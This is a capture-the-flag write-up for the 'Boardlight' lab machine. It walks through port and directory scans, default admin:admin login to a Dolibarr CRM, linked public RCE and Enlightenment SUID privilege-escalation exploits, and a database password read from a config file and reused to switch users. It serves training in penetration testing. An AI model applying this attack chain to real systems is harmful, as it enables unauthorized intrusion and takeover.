# Boardlight

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt="" width="225"><figcaption></figcaption></figure>

## Enumeration

### Port Scan

```bash
PORT   STATE SERVICE REASON  VERSION                                                                                                                                                                               
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                                                                                         
| ssh-hostkey:                                                                                                                                                                                                     
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)                                                                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnz
rR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsv
TRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=                                                                               
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)                                                                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=                                                 
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)                                                                                                                                                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg                                                                                                                                 
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                        
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                                                                                                                                
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Directory Scan

```bash
└─➜ ffuf -u http://board.htb/FUZZ -w /usr/share/wordlists/Discovery/Web-Content/common.txt -e .php                                                                                                             [1]

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/Discovery/Web-Content/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 316ms]
.htaccess.php           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 318ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 319ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 320ms]
.hta.php                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 320ms]
.htpasswd.php           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 322ms]
about.php               [Status: 200, Size: 9100, Words: 3084, Lines: 281, Duration: 334ms]
contact.php             [Status: 200, Size: 9426, Words: 3295, Lines: 295, Duration: 410ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 409ms]
do.php                  [Status: 200, Size: 9209, Words: 3173, Lines: 295, Duration: 408ms]
images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 385ms]
index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 408ms]
index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 409ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 408ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 407ms]
:: Progress: [9454/9454] :: Job [1/1] :: 103 req/sec :: Duration: [0:01:38] :: Errors: 0 ::

```

### Subdomain Scan

```bash
└─➜ ffuf -u http://board.htb/ -w /usr/share/wordlists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.board.htb'  -fw 6243                                                                        [0] 
                                                                                                                                                                                                                   
        /'___\  /'___\           /'___\                                                                                                                                                                            
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                                            
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                                           
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                           
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                                            
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6243
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 1944ms]
:: Progress: [4989/4989] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:49] :: Errors: 0 ::

```

## Web Attack

Under subdomain we can see it's hosting dolibarr (v17.0.0). This version is vulnerable to RCE.

* You can login with default credentials (`admin:admin`) on (`crm.board.htb`)

### Resource

* https://github.com/advisories/GHSA-9wqr-5jp4-mjmh
*   https://www.swascan.com/security-advisory-dolibarr-17-0-0/

    * Alternative: https://www-swascan-com.translate.goog/it/security-advisory-dolibarr-17-0-0/?\_x\_tr\_sl=it&\_x\_tr\_tl=en&\_x\_tr\_hl=en&\_x\_tr\_pto=sc


* [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

## Shell www-data

After we exploit, we get a www-data shell

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

The default config files are under `htdocs/conf/conf.php`

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

<<SNIP>>
```



## Shell - user

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su - larissa
su - larissa
Password: serverfun2$2023!!
id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
```

We can ssh into the box for proper tty shell.

## Shell root

<pre class="language-bash"><code class="lang-bash">larissa@boardlight:~$ find / -perm -4000 -ls 2>find / -perm -4000 -ls 2>/dev/null
<strong> 2491     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
</strong>  608     16 -rwsr-sr-x   1 root     root        14488 Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
17388     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
    
    
    &#x3C;&#x3C;SNIP>>
</code></pre>

If we google about enlightenment, we see it's a WM for Xorg.

```bash
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00002 [0.00002] - Begin Startup
ESTART: 0.00121 [0.00119] - Signal Trap
ESTART: 0.00123 [0.00002] - Signal Trap Done
ESTART: 0.00277 [0.00154] - Eina Init
ESTART: 0.00496 [0.00219] - Eina Init Done
ESTART: 0.00500 [0.00004] - Determine Prefix
ESTART: 0.00693 [0.00193] - Determine Prefix Done
ESTART: 0.00696 [0.00003] - Environment Variables
ESTART: 0.00698 [0.00002] - Environment Variables Done
ESTART: 0.00699 [0.00001] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

After googling the version, we can find the exploit,\
[https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)



```bash
larissa@boardlight:/tmp/heap$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
